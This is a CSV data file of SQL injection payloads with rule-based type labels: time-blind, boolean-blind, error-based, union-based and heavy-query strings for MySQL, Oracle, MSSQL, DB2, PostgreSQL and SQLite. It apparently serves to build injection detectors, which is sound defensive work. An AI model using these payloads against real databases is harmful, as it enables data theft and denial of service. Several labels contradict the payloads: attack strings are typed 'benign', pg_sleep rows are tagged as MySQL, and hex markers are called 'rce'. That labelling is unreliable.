row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7680,"1"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""isbh"" like ""isbh",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
7681,( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4501 = 4501 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
7682,1 ) where 3979 = 3979 rlike sleep ( 5 ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7683,1 ) ) and 4595 = 4595#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7684,1%' ) ) and 1651 = 9324 and ( ( '%' = ',1,,boolean_blind,generic,0.95,1651 = 9324 and detected — boolean_blind injection (priority 8) on generic,rule-based
7685,"1' where 1085 = 1085 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
7686,1 ) ) as pynj where 7683 = 7683 waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7687,"1%' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = '",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
7688,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'yznn' like 'yznn",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7689,1%' and 6454 = 8348 and '%' = ',1,,boolean_blind,generic,0.95,6454 = 8348 and detected — boolean_blind injection (priority 8) on generic,rule-based
7690,select sleep ( 5 ) and ( 4863 = 4863,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7691,1'|| ( select 'ogyu' from dual where 6691 = 6691,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7692,1 ) ) as lkqx where 6468 = 6468 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7693,"1"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""lsis"" like ""lsis",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
7694,"( select ( case when ( 1938 = 1938 ) then dbms_pipe.receive_message ( chr ( 118 ) ||chr ( 118 ) ||chr ( 112 ) ||chr ( 76 ) ,5 ) else 1938 end ) from dual )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7695,"1%' ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
7696,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'tjvy' like 'tjvy,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7697,"1 ) ) as zmsa where 6909 = 6909 union all select null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7698,"1' where 4039 = 4039 union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7699,"-5355"" or make_set ( 9354 = 9354,7185 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7700,"1'|| ( select 'fzcu' where 9252 = 9252 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) ||'",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7701,"1' ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7702,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
7703,"1 ) as drbw where 2380 = 2380 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
7704,"-6629%"" ) ) ) or 8571 = 8571--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7705,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7706,1' ) where 3636 = 3636 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
7707,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'ckpm' = 'ckpm",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
7708,"-8054' ) ) union all select 5232,5232,5232,5232,5232,5232,5232#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7709,-2983' ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
